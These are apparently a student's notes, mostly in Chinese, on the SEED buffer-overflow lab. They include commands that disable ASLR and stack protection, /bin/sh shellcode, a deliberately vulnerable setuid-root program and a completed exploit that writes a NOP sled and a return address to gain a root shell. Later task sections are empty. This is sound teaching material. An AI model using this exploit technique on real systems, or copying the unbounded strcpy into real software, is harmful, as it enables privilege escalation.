# Buffer-Overflow Vulnerability Lab

缓冲溢出

[实验指导](https://seedsecuritylabs.org/Labs_16.04/PDF/Buffer_Overflow.pdf)

## 实验任务

### Turning Off Countermeasures

关闭相关的防御机制

#### Address Space Randomization 
系统自带的地址空间随机化的机制. 

``` sh
sudo sysctl -w kernel.randomize_va_space=0
```

#### The StackGuard Protection Scheme

编译 C 文件的时候让 GCC 关闭栈保护
``` sh
gcc -fno-stack-protector example.c
```

#### Non-Executable Stack
不可执行栈. 

[参考](https://blog.csdn.net/zither/article/details/443603)


#### Configuring /bin/sh (Ubuntu 16.04 VM only)

### T1 Running Shellcode

体验一下 shellcode

代码 *task1.c*
``` C
#include <stdio.h> 
#include <unistd.h>
int main() {
    char *name[2];
    name[0] = "/bin/sh";
    name[1] = NULL; 
    execve(name[0], name, NULL);
}
```

代码 *call_shellcode.c* 是 *task1.c* 的汇编版本. 
``` C
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

const char code[] =
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\x50"                 /* pushl   %eax                   */
    "\x68""//sh"           /* pushl   $0x68732f2f            */
    "\x68""/bin"           /* pushl   $0x6e69622f            */
    "\x89\xe3"             /* movl    %esp,%ebx              */
    "\x50"                 /* pushl   %eax                   */
    "\x53"                 /* pushl   %ebx                   */
    "\x89\xe1"             /* movl    %esp,%ecx              */
    "\x99"                 /* cdq                            */
    "\xb0\x0b"             /* movb    $0x0b,%al              */
    "\xcd\x80"             /* int     $0x80                  */
;

int main(int argc, char **argv) {
    char buf[sizeof(code)];
    // 为什么不直接使用 code? 
    strcpy(buf, code);
    // 这啥啊 ?
    ((void(*)( )) buf)( );
} 
```

::: tip

指导中给出的 *call_shellcode.c* 没有引入 string.h, *task1.c* 没有引入 unistd.h. 
:::

``` shell
gcc -z execstack -o call_shellcode call_shellcode.c
# or
gcc -z execstack -o task1 task1.c
```

这一步执行完毕后会起一个新的 shell, 一个孤孤单单的 `$`. 

### The Vulnerable Program

*stack.c* 
``` C
/* Vunlerable program: stack.c */
/* You can get this program from the lab's website */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#ifndef BUF_SIZE
#define BUF_SIZE 24
#endif

int bof(char *str) {
    char buffer[BUF_SIZE];
    // buffer 只有 24B, 而 str 有 517B, 创造溢出. 
    strcpy(buffer, str);       
    return 1;
}

int main(int argc, char **argv) {
    char str[517];
    FILE *badfile;

     /* Change the size of the dummy array to randomize the parameters
       for this lab. Need to use the array at least once */
    char dummy[BUF_SIZE];  
    memset(dummy, 0, BUF_SIZE);

    badfile = fopen("badfile", "r");
    // 从 badfile 文件中读取 517B 内容, 并交给 bof 方法. 
    fread(str, sizeof(char), 517, badfile);
    bof(str);
    printf("Returned Properly\n");
    return 1;
}
```

编译 *stack.c* 并修改文件用户与访问权限. 
``` sh
gcc -DBUF_SIZE=24 -o stack -z execstack -fno-stack-protector stack.c
sudo chown root stack
sudo chmod 4755 stack
```


### T2 Exploiting the Vulnerability

这个任务在 *exploit.c* 中修改 buff, 添加合适的内容, 并写入 badfile 中. 这之后运行 *stack.c*, 如果一切正常, 可以得到一个 root shell. 

*exploit.c*
``` C
/* exploit.c  */

/* A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char shellcode[]=
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\x50"                 /* pushl   %eax                   */
    "\x68""//sh"           /* pushl   $0x68732f2f            */
    "\x68""/bin"           /* pushl   $0x6e69622f            */
    "\x89\xe3"             /* movl    %esp,%ebx              */
    "\x50"                 /* pushl   %eax                   */
    "\x53"                 /* pushl   %ebx                   */
    "\x89\xe1"             /* movl    %esp,%ecx              */
    "\x99"                 /* cdq                            */
    "\xb0\x0b"             /* movb    $0x0b,%al              */
    "\xcd\x80"             /* int     $0x80                  */
;

void main(int argc, char **argv) {
    char buffer[517];
    FILE *badfile;

    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(&buffer, 0x90, 517);

    /* You need to fill the buffer with appropriate contents here */ 
    strcpy(buffer+100,shellcode);
    strcpy(buffer+0x24,"\xbb\xf1\xff\xbf");

    /* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}

```

stack.c 中存在缓冲溢出的情况, 


important 中的信息很重要. 

### T3 Defeating dash’s Countermeasure

### T4 Defeating Address Randomization

### T5 Turn on the StackGuard Protection

### T6 Turn on the Non-executable Stack Protection

